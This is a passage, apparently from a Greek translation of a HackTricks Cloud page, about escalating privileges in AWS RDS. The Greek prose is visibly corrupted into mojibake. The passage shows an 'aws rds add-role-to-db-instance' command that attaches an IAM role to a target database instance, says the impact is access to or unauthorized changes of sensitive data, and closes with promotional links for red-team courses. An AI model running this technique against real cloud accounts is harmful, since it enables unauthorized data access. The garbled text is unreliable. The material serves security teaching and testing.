Î— DB instance Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÎºÏ„ÏŒÏ‚ ÎµÎ½ÏŒÏ‚ cluster Î³Î¹Î± Î±Ï…Ï„ÏŒ
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚**: Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½ÎµÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î·Î½ RDS instance.

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
